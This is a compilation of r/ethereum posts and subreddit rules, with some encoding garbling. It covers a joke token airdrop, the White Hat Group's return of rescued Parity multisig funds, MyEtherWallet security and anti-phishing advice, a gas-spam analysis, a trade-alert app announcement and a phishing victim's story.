ICOs are not effective vehicles for innovation, and don't deserve the focus we've been giving them. This argument can be made historically, it can be made game-theoretically, and it can be made simply by comparing the rate of ICOs (astonishing) with the rate of utility growth they bring (paltry)."

## Rules

---

Below are the rules that Reddit users on /r/Ethereum must follow to participate. These can be used as reasons to remove posts/comments and ban users.

### Golden Rule

You are expected to treat everyone with a certain level of respect and refrain from inappropriate behavior. Examples of inappropriate behavior include:

- Personal insults
- Threats of violence or attempts to organize attacks
- Slurs of any kind
- Posting people‚Äôs private information

If you can't play nice with others, you will not be allowed to post here.

### Ether Price, Market and Mining discussions

Discussion related to the price of ether, buying, trading, market speculation, or any other price/market talk should be posted on /r/ethtrader, a third-party Subreddit not moderated by us. In addition, keep mining discussion to Subreddits such as /r/EtherMining.

### Duplicate threads

Duplicate threads may be deleted. It is up to the discretion of the mods.

### No spamming or drive by posting

Spamming will lead to post deletion and a possible ban. Posts created by accounts that self-delete immediately will be deleted right away - no _drive by posting_.

### Using multiple accounts

Creating multiple accounts to get around Reddit or Subreddit rules is not allowed and will likely result in a permanent ban.

### Misleading titles

Posts with purposely misleading or unsubstantiated titles will be removed.

### Karma & age requirements for posting submissions

All post submissions should be made from accounts at least 10 days old with a minimum of 20 comment karma. This is to keep trolls and spam-bots to a minimum. Exceptions may be made on a discretionary basis, message the mods for more information.

---

## Moderation philosophy

---

/r/Ethereum is a place for the open discussion about the Ethereum software, protocol, distributed applications, and related technologies. As moderators, we are here to make sure the discussion stays civil and productive. We will not censor posts based on personal ideology and welcome constructive discourse.

### What we ask of our users

- Please utilize the up-vote and down-vote buttons. This is a built in moderation tool that is very powerful.
- If you submit a report about a post or comment, please provide as much detail as possible to help us more quickly sort through our reported posts/comments.
- Please don‚Äôt report posts or comments you disagree with, only about things that actually break the rules.
- We welcome discussions about other crypto-currencies and Ethereum implementations, but if the topic is already being extensively covered by other threads we kindly ask you to consider posting it to a more specific Subreddit. You can check an extensive (but not comprehensive) list of Ethereum-related Subreddits on the [""All Ethereum"" Multireddit](https://www.reddit.com/user/all_ethereum/m/all_ethereum).

### Moderation logs

The moderation logs are [public and available for review here](http://snew.github.io/r/ethereum/about/log).

I have created /r/WednesdayCoin and will be talking more about Wednesday Coin and working potentially on a faucet or tipbot as well, so come join us there. I recommend NOT trying to send the coins when it is not Wednesday since the transaction will go through as Successful but the coins won‚Äôt actually transfer so you will lose what you spent as gas.

Hey everyone, for fun and gain some experience into Ethereum and smart contract development I created a (very) basic token than can only be sent on Wednesdays! This is not an ICO or anything and the tokens hold no value but I will be airdropping them to whomever wants some. 

&nbsp;

I liked the idea of a token that is super specialized (only usable on Wednesdays) so I ran with it. If you want some post an ethereum address (myetherewallet or metamask are good). I'll airdrop to as many posts as I can. Thanks.

Update 5: 5 mins left. I will send to everyone i can!

Update 4: Less than 1 HOUR! I am trying to send to as many as possible but I know that I won't be able to send to everyone.

Update 3: Less than 2 hours to go! I am trying to send to as many people as I can! Also a great way to show your friends and coworkers how to use crypto!

Update 2: Hey all it is a little over 8pm UTC and I will continue to try to send out and respond as much as I can before the day's end. I may also get someone else to help me send some Wednesday coins out to get it done faster. Thanks again to everyone and don't forget to share with your friends! 

Update: Thanks everyone, I am responding and sending coins out as fast as I can! I still got a lot of coins to give out and will continue giving them out but if there is any problems with the coins sent please PM. I will be monitoring this as closely as I can for new addresses and if you don't want to post your address here, please feel free to PM me. Thanks again! "

BarterDex works with on-chain atomic swaps. Ethereum doesn't have the opcodes necessary, for this reason many projects that are working on atomic swaps with Ethereum have focused on simulating the missing parts with smart contracts. 

Komodo team has instead found a clever workaround that has rapidly led to success, it's less prone to bugs and also a lot cheaper in gas cost than all other solutions.

## Rules

---

Below are the rules that Reddit users on /r/ethereum must follow to participate. These can be used as reasons to remove posts/comments and ban users.

### Golden Rule

You are expected to treat everyone with a certain level of respect and refrain from inappropriate behavior. Examples of inappropriate behavior include:

- Personal insults
- Threats of violence or attempts to organize attacks
- Slurs of any kind
- Posting people‚Äôs private information

If you can't play nice with others, you will not be allowed to post here.

### Ether Price, Market, and Mining discussions

Discussion related to the price of ether, buying, trading, market speculation, or any other price/market talk should be posted on /r/ethtrader, a third-party Subreddit not moderated by us. Besides, keep mining discussion to Subreddits such as /r/EtherMining and obvious ICO advertisements to r/ethinvestor or similar.

### Duplicate threads

Duplicate threads may be deleted. It is up to the discretion of the mods.

### No spamming or drive by posting

Spamming will lead to post deletion and a possible ban. Posts created by accounts that self-delete immediately will be deleted right away - no _drive by posting_.

### Using multiple accounts

Creating multiple accounts to get around Reddit or Subreddit rules is not allowed and will likely result in a permanent ban.

### Misleading titles

Posts with purposely misleading or unsubstantiated titles will be removed.

### Karma & age requirements for posting submissions

All post submissions should be made from accounts at least ten days old with a minimum of 20 comment karma. This is to keep trolls and spam-bots to a minimum. Exceptions may be made on a discretionary basis; please do not message the mods for more information.

---

## Moderation philosophy

---

/r/ethereum is a place for the open discussion about the Ethereum software, protocol, distributed applications, and related technologies. As moderators, we are here to make sure the conversation stays civil and productive. We will not censor posts based on personal ideology and welcome constructive discourse.

### What we ask our users

- Please utilize the up-vote and down-vote buttons. This is a built-in moderation tool that is very powerful.
- If you submit a report about a post or comment, please provide as much detail as possible to help us more quickly sort through our reported posts/comments.
- Please don‚Äôt report posts or comments you disagree with, only about things that break the rules.
- We welcome discussions about other crypto-currencies and Ethereum implementations, but if the topic is already being extensively covered by other threads, we kindly ask you to consider posting it to a more specific Subreddit. You can check an extensive (but not comprehensive) list of Ethereum-related Subreddits on the [""All Ethereum"" Multireddit](https://www.reddit.com/user/all_ethereum/m/all_ethereum).

### Moderation logs

The moderation logs are [public and available for review here](http://snew.github.io/r/ethereum/about/log).

0,ethereum,"Huge Milestone: Ethereum Stack Exchange graduates as one of the top-35 world technology sites. I'm very attached to this project, so I hereby wish to announce that I just received the notice that [Ethereum Stack Exchange](https://ethereum.stackexchange.com) is [cleared for final graduation](https://ethereum.meta.stackexchange.com/q/474/87) and immediately dropped beta status. Ethereum was one of the fastest ever graduated Q&A sites in the Stack Exchange network (~ 500 days)!

**This is a huge milestone**, not only for Ethereum Stack Exchange, but for the whole Ethereum community. Ethereum joins an elite of 35 technologies which deserve it's own fully-fledged Stack Exchange Q&A site in the network, in one line with communities like [Ubuntu](https://askubuntu.com/), [LaTeX](https://tex.stackexchange.com/), [Blender](https://blender.stackexchange.com/), [Mathematica](https://mathematica.stackexchange.com/), and [Android](https://android.stackexchange.com/) - just to name a few, and not to forget joining one network with popular sites like [Stack Overflow](https://stackoverflow.com/), [Super User](https://superuser.com/), and [Server Fault](https://serverfault.com/).

I would like to thank the Stack Exchange team for giving us the chance to field-test the site with a private and public beta, Roman Mandeleil for proposing Ethereum at [Area51](https://area51.stackexchange.com/proposals/89704/ethereum), Hudson Jameson & Joris Bontje & _eth_ for moderating the site, and all the users contributing questions, answers, tags, wikis, votes, flags, and everything else! Thank for making this possible!

**But, huh, what does that mean?** The final graduation will be [fulfilled in two steps](https://meta.stackexchange.com/questions/260754/). The first one, basically removing the beta logo and immediately enabling the following features:

- **moderator elections**: community members can nominate and vote on new site moderators (finally, this was needed so badly, really! :)
- **community ads**: community members can propose free advertisements for non-profit and/or open-source projects in the Ethereum ecosystem which will be visible on the site
- **network effect**: a link to Ethereum Stack Exchange will appear in any footer of all sites across the Stack Exchange network

The second step, which might take a while, based on the availability of the design team of Stack Exchange includes:

- **custom site theme**: the site will get an unique Ethereum-styled theme (uh-oh!)
- **reputation adjustments**: privileges will be adjusted to higher levels of reputation

Please, if you are feeling happy today, cheer with us on [_meta_](https://ethereum.meta.stackexchange.com/), if you don't have an account yet, feel free to [explore the site first](https://ethereum.stackexchange.com/tour), and if you have any questions, ask me anything!

---

**Update**: If you want to run for moderator in the graduation elections 2017, please [follow this thread](https://ethereum.meta.stackexchange.com/questions/477/2017-graduation-moderator-election-qa-question-collection) and [here are the first elections](https://ethereum.stackexchange.com/election/1).

**Update**: Using the traction of this post to ask - If someone knows _ComandanteCheth_, please, [send him this way](https://ethereum.meta.stackexchange.com/questions/450/bump-for-google-code-prettify-lets-get-this-done). :)"
0,ethereum,"The WHG has Returned 100% of the Rescued Funds to their Rightful Owners Over the last week, using [blockchain based signaling](https://etherscan.io/address/0x3abe5285ED57c8b028D62D30c456cA9eb3E74105#code) and manual sends over Skype calls, we returned ~98% of the funds. Today we returned that last 2%. Every multisig that [signaled using our smart contract](https://www.reddit.com/r/ethereum/comments/6p4luj/rescued_multisig_owners_can_use_a_smart_contract/) had their funds returned to the requested return address. The multisigs that did not signal had their ether and tokens sent to their [WHG Deployed Multisigs](https://www.reddit.com/r/ethereum/comments/6owvor/the_replacement_multisig_wallets_have_been/) which have been [tested and bug bountied all week by the Parity team and the community at large](https://blog.parity.io/security-update/). 


You can see all of our sends [on Etherscan](https://etherscan.io/address/0x1dba1131000664b884a1ba238464159892252d3a). It is worth noting that this address contained funds when the rescue mission began, and received funds during the operation. You can also see a summary of all of our transactions in [this CSV file on github](https://github.com/Giveth/WHGBalanceVerification/blob/master/WHGMultisigReturnTxs.csv).



**The Other White Hat!**

We worked closely with the [other White Hat](https://www.ethnews.com/meet-the-unknown-maverick-white-hat-who-rescued-accounts-missed-by-the-whg-during-this-weeks-attack), who also returned the balance of his rescued funds today. You can see all of his work on Etherscan [here](https://etherscan.io/address/0xd1f27c48b948d49f3d098f499b8a1830d8a7e229) and [here](https://etherscan.io/address/0x1ff21eca1c3ba96ed53783ab9c92ffbf77862584). His transactions are also included in the [CSV file](https://github.com/Giveth/WHGBalanceVerification/blob/master/WHGMultisigReturnTxs.csv)




**WHG Donations**

We can not express enough gratitude to the community at large for their participation in helping to recover these funds. This operation was aided directly by over 30 people and indirectly by countless others. Many people have requested/demanded a donation address so we created a donation account following the [Giveth](http://giveth.io/) model, which generates a White Hat Donation Token when it receives ether.

Our donations address is `whitehats.eth` which resolves to `0xd556cAF704e39fc728058557a113b226207D2212` it requires a `gasLimit` of 155,000 gas.


Half of the donations will go to the 30+ people involved in helping in this specific action, these people will receive non-transferable WHG tokens which will be used to collect their portion of the donations from a withdraw contract once we can test it and obtain everyone‚Äôs account addresses.

The other half of the donations will go to a White Hat Fund to support smart contract security and future White Hat actions, while also acting as a legal contingency fund. 




**Sadly Not Everyone Was Saved**

There were at least two other addresses that utilized this exploit but have not stepped forward to return the funds as far as we know, [the original hacker](https://etherscan.io/address/0xb3764761e297d6f121e79c32a65829cd1ddb4d32) that drained the [Swarm City](https://press.swarm.city/parity-multisig-wallet-exploit-hits-swarm-city-funds-statement-by-the-swarm-city-core-team-d1f3929b4e4e), [Aeternity](https://blog.aeternity.com/parity-multisig-wallet-hack-47cc507d964d), and [Edgeless](https://medium.com/@tomasdraksas/edgeless-response-to-parity-hack-3e35e20ba85c) Multisigs and another [later hacker that was able to grab almost $250k worth of tokens](https://etherscan.io/address/0xdfb692d180cae04bb29b6cd9878ede2ec8e79f45).

Of the victims, we have stayed in closest contact with Swarm City, who alerted us of the exploit in the first place, giving us the head start we needed to preserve the funds that we could. Swarm City has [explicitly declined to accept any donations](https://press.swarm.city/follow-up-statement-from-the-swarm-city-core-team-3ab0f1274ad3), saying that if people want to help they can [join their slack](https://slackinvite.swarm.city/) to participate in their efforts to decentralize commerce, and if they still feel compelled to help financially, they can buy their SWT token and hold them.

This is just one of many stories from the past week that has reaffirmed our faith in the Ethereum community. We truly have the best community in crypto, which is what attracted us to the project in the first place. This community has always been and will always be Ethereum‚Äôs strongest asset. **Thank you all!**

Edit: /u/bokkypoobah, being the White Hat that he is, has found several other attackers that have yet to step forward to return the funds. :-( [See his well documented expose on this event](https://github.com/bokkypoobah/ParityMultisigRecoveryReconciliation#parity-multisig-recovery-reconciliation) for [the complete list](https://github.com/bokkypoobah/ParityMultisigRecoveryReconciliation#attacking-accounts).

0,ethereum,"[UPDATED] It‚Äôs Time to Get Real: Stop Relying on Third Parties to Protect You & Your Funds. You are responsible for your security. [Eight months ago ETH was ~$13, phishing sites were everywhere, and too many people were losing ETH.](https://www.reddit.com/r/ethereum/comments/556frk/its_time_to_get_real_stop_relying_on_third/)

Today ETH is ~$260, Bitcoin bloggers, low-entropy phrases, and Teamviewer hacks are (not quite) everywhere, but getting more popular, and too many people are losing ETH.

---

## How can you protect yourself? 

1. **Get yourself a Ledger or Trezor Hardware wallet.** They are less than 0.5 ETH now and a variety of wallets support them. There is really, really no excuse. https://www.ledgerwallet.com & https://shop.trezor.io/

2. If you don't want one of these nifty devices, use cold storage for a majority of your savings. Please. Pretty please.

3. **Bookmark your crypto sites.** Use those bookmarks and only those.

4. **Turn on 2FA for everything.** Go do it. Right now. Quit your excuses. Choose Google Authenticator over Authy. Don't use your phone number. Then, make sure your phone number is NOT tied to your Google account (look in privacy settings). Turns out, you and your BFF Mr. Hacker can ""recover"" access to your account via that number, completely destroying the point of 2FA. *PS: Don't forget to cold-storage your backup words for these 2FA things. It's a huge pain when your phone goes for a swim and your entire life is 2FA'd.* üòä

4. **Do not use cloud storage (Dropbox, Drive, iCloud) for storing your keys** [:(]( https://twitter.com/izqui9/status/872364163330428931)Now your keys would only be protected by your cloud storage password. Also, see #4.

5. **For Token Sales: do not trust any address except the one posted on the official site.** Bookmark the URL before the sale, get the address from the URL from your bookmark at time of purchase. Do not trust any other source (especially a random bot on Slack). *PS: When are token sales going to start using ENS names?*

6. **Double check the URL.** Check it. Then, check it again right before entering any information. This is especially important for any sites that require usernames, passwords, email addresses, private keys, and any other personal information. SSL certs do not mean a site is trustworthy, just that they bought an SSL cert. Not sure about the correct URL? *Cross reference* Reddit, Twitter, Github, Slack and wherever else the project hangs out.

7. **Triple check Github URLs.** These are much easier to fake and much easier to miss. Instead of downloading from that random URL on reddit, seek out the URL on your own. Following the developers of these repos on Twitter, friending them on reddit (lol...but seriously it's nice because their name will be orange), or starring said repos on Github helps.

6. **Always verify that the site you landed on is legit.** Especially if you are about to entire your private key or download an application. What is legit? A service that people have used for a decent period of time with good results. If the URL has been registered in the last week or the site ""just launched"", err on the side of caution and avoid it for a while.

8. **Google the service name + ""scam"" or ""reviews"".** Scam sites rarely last long. Value real comments by real people over a random blog. Value a *collection* of information over a single source. Understand that legit services will likely have a mix of positive and negative reviews over a long period of time. Scam sites typically have no one talking about them, everyone yelling about how they got robbed, or the most perfect reviews ever. The latter one is just as red of a flag as the first one. 

9. **Don't ever run remote-access software (e.g. TeamViewer)** ever...but especially not on a computer with keys on them. The number of security holes in these programs is atrocious. You 2FA your entire life, but then let a single string of characters give someone access to your *entire* computer & every account. üò±

10. **Don‚Äôt click any link regarding anything crypto, money, banking, or a service like Dropbox / Google Drive / Gmail in any email ever.** And if the scammy clickbait was simply too irresistible for you, don‚Äôt enter any information on the page.

11. **Install an adblocker that actually turns off Google/Bing Ads.** I recommend going with [uBlock Orgin](https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en). If you are already using Adblock Plus, it does not hide Google Ads from you. Go into your Adblock Plus settings and uncheck the box that says ‚ÄúAllow some non-intrusive advertising‚Äù. 

12. **Don‚Äôt click on advertisements.** With or without an adblocker, you should never, ever click on advertisements.

13. **If you have accidentally visited or typed a malicious site, clean out your recent history and autocomplete.** This will prevent you from typing `kra‚Ä¶` and having it autocomplete to the malicious `krakken.com`. 

14. **No one is giving you free or discounted ETH. Even for completing a survey.** 

15. **The guys who just finish their token sale don't want to sell you tokens via Slack DM.** Neither does that smokin' hot 125px x 125px avatar. 

16. **Lastly: use your brain.** Think for a moment. Don't assume, ask. Don't blindly follow, question. If something doesn't seem right...if you feel like the luckiest fucker on Earth...or if you find yourself asking, ""I wonder why I haven't seen this on reddit yet"", there is likely a reason. üëç

## A note about Ethereum Chamber scam yesterday

As some of you are aware, there was a scam site yesterday that was a clone of MyEtherWallet.com, but red. I was alerted to it via a Facebook message ~5am from a diligent user. That is one of 3 messages I received about it before our tweet went up at 1pm, not including the 5 from our internal team (thank goodness someone realizes our site isn't red!)

Since that site has come to light, a number of folks have mentioned things like, ""Oh yeah I saw it, I figured you guys were just rebranding"" or ""Oh weird. Yeah I figured it was a scam.""

This site, which *I* thought was only a paid CoinTelgraph blurb at the time, was actually on a large number of Bitcoin blogs: podcasts, blogs, news sites, Twitter, the works. 

How does this happen? How do a number of bloggers promote a direct (red) clone of MEW, people see it, and no one says anything? *(The fact that all these bloggers & ""news"" organizations gleefully accepted money from a wallet site without Googling ""ether wallet"" or ""Name of the Site"" is a far too angry and long rant, but should not go unnoticed.)* 

Anyways!

---

## While the above post is all about the steps *you* should take to protect yourself, there is another one that is even more important:

## Look out for one another

Scammers thrive because they have victims -- because they know they can throw a stupid website out there and people will click it. Stop thinking, ""Well, they shouldn't have clicked it"" and start doing what you can to prevent people from making a mistake that will cost them their hard-earned coins. 

- If you notice something looks like MEW, say *""Hey, that looks like a clone of MEW! I wonder if they've seen it?""*

- If you think that Github URL looks weird but you don't have the time to check, throw a *""hey u sure thats rite url?""* up there. 

- If that reddit post is an unheard of wallet, leave a comment and report it with a *""??????????""* in the report reason.

- If the Token Sale you are participating it doesn't tell you explicitly when & where their address will be posted, ask them, in public, over and over again. If its not at least 24 hours before the Token Sale, question that choice, in public, over and over again. 

- Remind people about best practices! If you've been visiting /r/ethereum for more than 3 months, you have 3 months on 25% of the people here. You are a bloody expert now. Time to put on your big boy pants:

- *""It looks like this is an okay link, but it's not a good idea to click or install things from a random user on reddit. It could be malware.""*

**There needs to be more due diligence everywhere, but this is easier diligence than most. It requires no advance knowledge or skills. You don't even have to be able to write good. Stay aware, trust your gut, ask more questions, trust the internet less, and google the fuck out of everything.**

0,ethereum,"XMR hash rate dropped by over 80% after ASIC hard fork All I can say is I tried. I mined ETH faithfully for the last two years because I believed in Ethereum and the dev team. I never sold a single coin. I like a lot of other miners were extremely disappointed in the dev  meeting last week by the slap in the face they gave the GPU miners and refused to even consider moving forward with a very small change to stop the ASICs.

All the miners know, but until now, have been unable to prove Bitmain has driven both hashrates up and prices down by mining our coins and selling them. Well now we have proof as Monero difficulty has dropped by 80% since their anti ASIC fork.

We tried guys, so now comes the inevitable switch of miners from ETH to XMR which will now leave Ethereum vulnerable to Bitmain. Soon only ASICs will be mining ETH.

If you are a miner go to [WhatToMine.com] (http://www.whattomine.com) and set difficulty and profitability for current. Monero is 2x more profitable than Ethereum. You had your chance dev team to give the loyalist miners a reason to stay with ETH and you laughed at us. We shall see who has the last laugh.

*Edit: Everyone that thinks they can possibly convince people that the community is against a hardfork to prevent ASICs are sadly mistaken. Remember last week Vlad took a Twitter poll that showed 57% were in favor and only 13% said no. Because of this I am pretty sure all the people posting on here against a fork are Bitmain hires here to suppress public opinion. [Would you support a hard fork that obsceletes ETH ASICs?] (https://twitter.com/VladZamfir/status/979060233430552576)*

*For the people that think Bitmain just started making ASIC mining hardware, think again. This chart https://bitinfocharts.com/comparison/monero-hashrate.html shows Monero dropped back to almost one year ago hash levels. This tells us that Bitmain runs their miners for almost a year before they start releasing to the public. The E3 that Bitmain just happened to announce prior to the dev meeting last week was their rev1 version from a year ago. They purposely released a non competitive miner so they could fool the dev team into believing there is no threat. Because of the rumors Bitmain was forced to show something to prevent the dev team from doing something out of FUD. The Bitmain team is laughing all the way to the bank as their latest miners are getting close if not surpassing the 51% level.*"

## Getting Started

### What is Ethereum?

Ethereum is a cutting edge blockchain-based distributed computing platform, featuring smart contract functionality. It provides a decentralized virtual machine, the Ethereum Virtual Machine (EVM), that can execute peer-to-peer contracts using a crypto-fuel called _Ether_.

0,ethereum,"Manipulated ETH network gas prices look connected to EOS funded bot accounts in possible indication of corporate network attack. X-Post from Team JUST discord (they make popular decentralized applications)

EDUCATIONAL: Hey @everyone, we know gas prices are astoundingly high today. Let's have a bit of an adventure and find out why shall we?

Today, 40&#37; of the ethereum's network is being used by this contract [https://etherscan.io/address/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483](https://etherscan.io/address/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483) A beautiful and innovative copy-paste of a default ERC20 standard token called ""IFishYunYu"" with no features. (So it does nothing.)

Yet miraculously, it seems tons of ""unique"" accounts are transferring massive volumes of this token constantly, almost 50 ETH of gas an hour have been steadily used for nearly 24 hours now. Just to transfer individual tokens to the Fcoin exchange. But of course. The exchange is just a red herring to distract you from what's really happening.

Let's see what the creator of this contract has been up to recently. [https://etherscan.io/tx/0xd0e334dca734071f395cad64df90269113ead321232e5603f66fc6fb2885c654](https://etherscan.io/tx/0xd0e334dca734071f395cad64df90269113ead321232e5603f66fc6fb2885c654) Looks like he minted nearly 5 Billion Ifish tokens about 12 days ago... to this account 0x45f64a7148d1cfeded427dd4380b458877e7ce56 which split it up across 10 or so accounts, that each do this [https://etherscan.io/token/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483?a=0xcd4777b5f4d8779e99ea996bb32988daf0bbbf3b](https://etherscan.io/token/0x98b4ca8bd52e4ed1f28d3f30d9f567d1166c9483?a=0xcd4777b5f4d8779e99ea996bb32988daf0bbbf3b) splitting it up across 500-600 accounts each.

Which are, the mystery ""unique"" accounts that are spamming the eth network. So yeah, it's one guy, it's the creator of the token. He was doing it during the previous Fcoin exchange competition too. He's running a multi-sided scheme, he even has bots running ""wash"" accounts. Like [https://etherscan.io/address/0xa67ef2aca4c6459e60821c1b1afe45812c4c1bcd#tokentxns](https://etherscan.io/address/0xa67ef2aca4c6459e60821c1b1afe45812c4c1bcd#tokentxns) which is pretty cool, it just shoves the token into other accounts, and then those accounts shove it into other accounts, and then back to the big main account to simulate volume on the token itself. Try following a transaction, you'll come right back to the big-daddy account.

most importantly on why is this being done? Let's see what one of the accounts funding all this eth might be doing [https://etherscan.io/token/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0?a=0x7a717e226a8b37b912d0effbb0aab24ab690dbdb](https://etherscan.io/token/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0?a=0x7a717e226a8b37b912d0effbb0aab24ab690dbdb) gee, that sure is a lot of crowdfunded EOS, hundreds of thousands to be exact. From an account that seems to receive large sums of eos and immediately market sell them for thousands of ETH, which is then distributed out to contracts like this. Contracts that have been pulling this kind of transaction attack consistently across the ETH network.

0,ethereum,"Any interest in an Ethereum-Tycoon game where you can earn (or lose) ETH by flipping virtual properties on the blockchain? (screenshots inside) I'm making a (in-browser WebGL) game where you can buy virtual properties on the ETH blockchain, build a house on them Sims-style and resale them for a, hopefully, higher price. Is this something which interests HODLers?

You will be able to buy properties, build houses on them or improve existing ones, add furniture, landscaping and vehicles if so desired, then (try to) resale at a higher value. Or you can just own virtual properties on the blockchain.

Of course for this kind of game a certain amount of centralization is still inevitable at this point, as with Cryptokitties et al. Storing whole house blueprints on the blockchain would currently cost a lot of gas for every transaction.

https://i.imgur.com/tK1NyqJ.jpg

https://i.imgur.com/5sldgH7.jpg

A game like this wouldn't be complete without a lambo prop ;)

https://i.imgur.com/J61i4jY.jpg

There could be two models:

1) The property value acts like a stock, where every buy increases the overall price, and every sale decreases it.

2) You can just set your own sale value (like CryptoKitties) and hope to sell higher than that you bought it after customizing the property.

What do you think?"

**AFTER WORKING NON-STOP FOR THE LAST 3 DAYS I HAVE FINISHED THE NEW WEBSITE! THE WEBSITE OFFERS THE SAME FEATURES AS THE MOBILE APP (FOR ALL YOU NON IPHONE USERS!) AS WELL AS INSTRUCTIONS HOW TO SET UP THE ALERTS LOCALLY ON YOUR OWN MACHINE IF YOU DO NOT TRUST THE APP (WHICH I FULLY UNDERSTAND). ALL FUTURE UPDATES WILL FIRST BE DEPLOYED ON THE WEBSITE AND LATER THE IOS APP**

http://cointradealerts.com

**I want to make sure you all know from the start this is 100% free to use. There are no advertisements/monetization whatsoever. I built this because it's something that I've been using for a few months and thought that I could strengthen my personal skill set and build out for others to enjoy.**

http://cointradealerts.com/

https://itunes.apple.com/us/app/coin-trade-alerts/id1329306758?ls=1&mt=8

It's a pretty simple app really. You create a view only API key, plug it into the app, add your phone number, and then you never have to open the app again. It will send you a text message when your orders fill. (It will work for all GDAX products)

Here's exactly how it works:

1) Generate **view only** API key (this allows the app to read your completed orders).

2) Provide your phone number/carrier (so I can build your contact email i.e 123456790@txt.att.net)

3) The app will make a request every 60 seconds and record the number of completed orders you have in a database. Every time it checks, it will see if there's a difference in the numbers. If there is, it will build a message with information from that many of your most recent fills (something like buy: X TICKER at $Y total: $Z)

I originally wrote most of the backend Python of this a few months ago and I've been running it on my Raspberry PI and sending me a text when my limit orders fill. The main reason why I wrote this is because I thought it was something crucial that other services didn't offer, and being a Software Engineer I could do quite easily. A bunch of my coworkers who were also into trading cryptocurrency on GDAX really wanted to use it so initially I was just giving them the code but then I decided that since i've always wanted to have an app under my name on the App Store and learn Swift, this would be the perfect opportunity.

I have all of the code publicly visible on my Github [HERE!](https://github.com/leggio/CoinTradeAlerts) The backend API is a flask web server running on an AWS EC2 Instance. The Database is an AWS RDS MySQL database. I've been using Flask for about 2 years and I never really thought that it could be practical for iOS development. It really surprised me how well it worked.
______________________________________________________________________________

Although my code is publicly visible and I am only reading your completed orders, there is obviously a trust level required on your end to give me the API key. Nobody here knows who I am and I fully understand that!

**If you provide anything more than VIEW ONLY your API key CAN be used to transfer your money/coins and steal them.**

If anyone does not feel comfortable doing so, you are more than welcome to use [the previous version](https://raw.githubusercontent.com/leggio/Cryptocurrency/master/Fill_Tracker.py) of this code and run it locally on your machine. This means that you are entering your API credentials locally on your own machine.

I am in the process of building out the website, which will include instructions as to how to do the above, as well as provide the same (and more!) functionality that the app does. The website should come out with the base features in a few days and will allow people who don't have iPhones to utilize this tool!

______________________________________________________________________________

**I originally posted about this on /r/litecoin and /r/bitcoin yesterday and received such overwhelming support that it was crashing the backend web server of my application. Today I was able to get this sorted out and nobody should experience any problems!**

______________________________________________________________________________


Additionally, I received a lot of great feedback from you guys, which is why I spent quite a few hours yesterday/today building a brand new website that will offer the exact same functionality as the mobile app, but in your browser! I plan on deploying in the days to come. I will be adding all user requests to the website as well.

What's currently on my todo list: 1) Security alerts! I had a phenomenal request from /u//swingvitamin to set up alerts when transfers/instant purchases are made on your account to try and combat account theft. I think this was an awesome idea and I will be working to bring this out ASAP!"

About 12h after the Kucoin  transfer someone transferred all the remaining coins in the my wallet to another wallet.

Everytime I made a transaction I did it from my Android phone. The private key was kept in a 7zip    encrypted archive that was stored on my phone and a backup on a newly created Google Drive account.

I know that the coins are lost forever but please help me understand how they stole in from me so that I don't make the same mistake twice.

Edit: It was a phishing job guys. I browse through my Google history and I discovered that I accessed www. myethierwalliet .com at some point. It's very strange that the transaction went through even though it was a phishing site.

### What is MEW?

https://i.imgur.com/rrkqpOw.png

*   MyEtherWallet is a free, open-source, client-side interface.
*   We allow you to interact directly with the blockchain while remaining in full control of your keys & your funds.
*   You and only you are responsible for your security.
*   We cannot recover your funds or freeze your account if you visit a phishing site or lose your private key.

---

### MyEtherWallet is not a Bank

https://i.imgur.com/zYsKqTe

*   When you open an account with a bank or exchange, they create an account for you in their system.
*   The bank keeps track of your personal information, account passwords, balances, transactions and ultimately your money.
*   The bank charge fees to manage your account and provide services, like refunding transactions when your card gets stolen.
*   The bank allows you to write a check or charge your debit card to send money, go online to check your balance, reset your password, and get a new debit card if you lose it.
*   You have an account with the bank or exchange and they decide how much money you can send, where you can send it, and how long to hold on a suspicious deposit. All for a fee.

---

### MyEtherWallet is an Interface

https://i.imgur.com/7QNSG0B.png

*   When you create an account on MyEtherWallet you are generating a cryptographic set of numbers: your private key and your public key (address).
*   The handling of your keys happens entirely on your computer, inside your browser.
*   We never transmit, receive or store your private key, password, or other account information.
*   We do not charge a transaction fee.
*   You are simply using our interface to interact directly with the blockchain.
*   If you send your public key (address) to someone, they can send you ETH or tokens. üëç
*   If you send your private key to someone, they now have full control of your account. üëé

---

### Wait, WTF is a Blockchain?

https://i.imgur.com/Wjs2hv3.png

*   The blockchain is like a huge, global, decentralized spreadsheet.
*   It keeps track of who sent how many coins to whom, and what the balance of every account is.
*   It is stored and maintained by thousands of people (miners) across the globe who have special computers.
*   The blocks in the blockchain are made up of all the individual transactions sent from MyEtherWallet, MetaMask, Exodus, Mist, Geth, Parity, and everywhere else.
*   When you see your balance on MyEtherWallet.com or view your transactions on etherscan.io, you are seeing data on the blockchain, not in our personal systems.
*   Again: we are not a bank

---

### We need you to understand that we **cannot**...

https://i.imgur.com/mY8gqoF.png

*   Access your account or send your funds for you X.
*   Recover or change your private key.
*   Recover or reset your password.
*   Reverse, cancel, or refund transactions.
*   Freeze accounts.

### **You** and **only you** are responsible for your security.

*   Be diligent to keep your private key and password safe. Your private key is sometimes called your mnemonic phrase, keystore file, UTC file, JSON file, wallet file.
*   If lose your private key or password, no one can recover it.
*   If you enter your private key on a phishing website, you will have all your funds taken.

---

### If MyEtherWallet can't do those things, what's the point?

https://i.imgur.com/FG9cYhd.png

*   Because that is the point of decentralization and the blockchain.
*   You don't have to rely on your bank, government, or anyone else when you want to move your funds.
*   You don't have to rely on the security of an exchange or bank to keep your funds safe.
*   If you don't find these things valuable, ask yourself why you think the blockchain and cryptocurrencies are valuable. üòâ
*   If you don't like the sound of this, consider using [Coinbase](https://www.coinbase.com/) or [Blockchain.info](https://blockchain.info/wallet/#/signup). They have more familiar accounts with usernames & passwords.
*   If you are scared but want to use MEW, [get a hardware wallet](https://myetherwallet.github.io/knowledge-base/hardware-wallets/hardware-wallet-recommendations.html)! These keep your keys secure.

### How To Protect Yourself from Phishers

https://i.imgur.com/zhEtRp7.png

Phishers send you a message with a link to a website that looks just like MyEtherWallet, EtherDelta, Paypal, or your bank, but is not the real website. They steal your information and then steal your money.

